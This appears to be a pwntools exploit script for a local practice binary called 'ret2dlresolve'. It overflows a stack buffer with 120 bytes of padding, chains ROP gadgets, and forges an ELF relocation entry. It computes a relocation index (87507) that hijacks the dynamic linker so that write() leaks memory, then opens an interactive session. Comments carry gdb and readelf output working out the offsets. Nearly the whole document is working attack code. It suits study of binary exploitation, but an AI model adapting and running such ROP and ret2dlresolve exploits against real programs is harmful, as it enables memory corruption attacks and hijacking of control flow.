#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./ret2dlresolve')

buf1 = 0x601080
hi = 0x4007b4 # leak POC
padding = 'a'*120

pop_rdi_ret = 0x0000000000400793
pop_rsi_r15_ret = 0x0000000000400791

'''
(gdb) p/x *reloc
$45 = {
  r_offset = 0x601018,
  r_info = 0x100000007,
  r_addend = 0x0
}
'''

rop = flat(
    'a'*0x10, 0x601018, 0x100000007, 0x0
)

'''
const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);

(gdb) macro expand (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset)
expands to: (const void *) ((l)->l_info[23]->d_un.d_ptr + reloc_arg * sizeof (Elf64_Rela))

sizeof(Elf64_Rela) = 24

$ readelf -Wa ./ret2dlresovle | less
Dynamic section at offset 0xe20 contains 24 entries:
    Tag                Type                 Name/Value
    0x0000000000000017 (JMPREL)             0x4004c8

Hijack reloc to buf1+16,
(0x601090 - 0x4004c8) / 24 = 87507

'''

# write(rdi, rsi, rdx);
rop1 = flat(
    padding, pop_rdi_ret, 0x1, pop_rsi_r15_ret,
    hi, 0x0, 0xdeadbeef, 0x40054b, 87507
)

r.sendline(rop)
raw_input('#')
r.sendline(rop1)

r.interactive()
